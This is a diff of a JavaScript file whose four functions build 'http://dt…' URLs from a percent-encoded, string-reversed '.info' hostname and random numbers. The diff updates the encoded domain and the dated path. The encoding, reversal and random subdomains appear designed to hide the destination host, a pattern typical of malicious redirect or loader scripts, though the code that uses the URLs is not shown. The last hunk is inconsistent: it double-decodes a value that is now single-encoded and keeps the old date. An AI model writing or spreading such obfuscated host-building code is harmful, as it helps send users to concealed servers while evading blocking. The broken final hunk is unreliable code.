@@ -7,11 +7,8 @@ function dttz01() {
 	
 
 
-	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%35%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
+	var codedturlok="%6f%66%6e%69%2e%31%30%30%31%2d%77%74%64%6e%65%68%7a";
 	
-	
-	
-	var strR0=parseInt(Math.random()*3000,10)+1001;
     
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
@@ -23,7 +20,7 @@ function dttz01() {
   
   
     
-  var dturlok="http://dt-" + strR0 + "." +  reverse(unescape(unescape(codedturlok))) + "/0729" + strN1 + strN2 ;
+  var dturlok="http://dt" + strR1 + strR2 + "." +  reverse(unescape(codedturlok)) + "/0731" + strN1 + strN2 ;
     
      
      
@@ -39,12 +36,10 @@ function dttz02() {
 	
 	
 
-	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%36%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
+	var codedturlok="%6f%66%6e%69%2e%32%30%30%31%2d%77%74%64%6e%65%68%7a";
 	
-	
-	
-	var strR0=parseInt(Math.random()*3000,10)+1001;
-	
+
+
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
   	 
@@ -55,7 +50,7 @@ function dttz02() {
   
   
     
-  var dturlok="http://dt-" + strR0 + "." +  reverse(unescape(unescape(codedturlok))) + "/0729" + strN1 + strN2 ;
+  var dturlok="http://dt" + strR1 + strR2 + "." +  reverse(unescape(codedturlok)) + "/0731" + strN1 + strN2 ;
     
     
      
@@ -72,13 +67,10 @@ function sttz01() {
 	
 			
 
-	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%35%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
+	var codedturlok="%6f%66%6e%69%2e%31%30%30%31%2d%77%74%64%6e%65%68%7a";
 	
 	
-	
-	var strR0=parseInt(Math.random()*3000,10)+1001;
-	
-	
+		
     
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
@@ -90,7 +82,7 @@ function sttz01() {
   
   
     
-  var dturlok="http://dt-" + strR0 + "." + reverse(unescape(unescape(codedturlok))) + "/8" + "/?d=0729" + strN1 + strN2 ;
+  var dturlok="http://dt" + strR1 + strR2 + "." + reverse(unescape(codedturlok)) + "/8" + "/?d=0731" + strN1 + strN2 ;
     
      
      
@@ -107,13 +99,10 @@ function sttz02() {
 	
 	
 
+	var codedturlok="%6f%66%6e%69%2e%32%30%30%31%2d%77%74%64%6e%65%68%7a";
+	
 
-	var codedturlok="%25%36%66%25%36%36%25%36%65%25%36%39%25%32%65%25%33%36%25%33%30%25%33%30%25%33%31%25%32%64%25%37%38%25%36%65%25%36%35%25%36%38%25%37%61%25%37%34%25%36%34";
-	
-	
-	
-	var strR0=parseInt(Math.random()*3000,10)+1001;
-	
+		
     
   var strR1=parseInt(Math.random()*10000,10)+1;
   var strR2=parseInt(Math.random()*10000,10)+1;
@@ -126,7 +115,7 @@ function sttz02() {
   
   
     
-  var dturlok="http://dt-" + strR0 + "." + reverse(unescape(unescape(codedturlok))) + "/8" + "/?d=0729" + strN1 + strN2 ;
+  var dturlok="http://dt" + strR1 + strR2 + "." + reverse(unescape(unescape(codedturlok))) + "/8" + "/?d=0729" + strN1 + strN2 ;
     
     
      
